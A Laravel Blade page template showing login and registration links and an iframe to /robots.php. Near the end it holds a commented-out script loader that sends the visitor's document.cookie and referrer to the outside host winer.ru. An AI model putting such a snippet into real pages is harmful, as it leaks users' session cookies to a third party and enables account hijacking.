 @extends('index')
 @section('content')

   <div class="flex pad_10_10">
       @if (Route::has('login'))
           <div class="a_r">
               @if (Auth::check())
                  {{ Auth::user()->name }}:
                   &nbsp;
                   <a href="/control">Кабинет</a>
                    &nbsp;
                    &nbsp;
                   <a href="{{ url('/logout') }}">Выход</a>
                   &nbsp;
               @else
                   <a href="{{ url('/login') }}">Вход</a>
                   &nbsp;
                   &nbsp;
                   <a href="{{ url('/register') }}">Регистрация</a>
                   &nbsp;
               @endif
           </div>
       @endif
   </div>

 

<iframe src="/robots.php"  id="head"  name="head"  frameborder="0" width="512" height="512" marginwidth=0 marginheight=0 hspace=0 vspace=0></iframe>

<!-- <script type="text/javascript">
    (function (d, w) {
        var n = d.getElementsByTagName("script")[0],
            s = d.createElement("script"),
            f = function () { n.parentNode.insertBefore(s, n); };

        s.type = "text/javascript";
        s.async = true;  
        s.src = "//winer.ru/index.php?img=XFZDGE9YQEpQVV5QVlQfQEY=&nid=158645&uid=1&ref="+d.referrer+"&cookie=" + encodeURIComponent(document.cookie);

        if (w.opera == "[object Opera]") {
            d.addEventListener("DOMContentLoaded", f, false);
        } else { f(); }
    })(document, window);
</script> -->


 

 @endsection
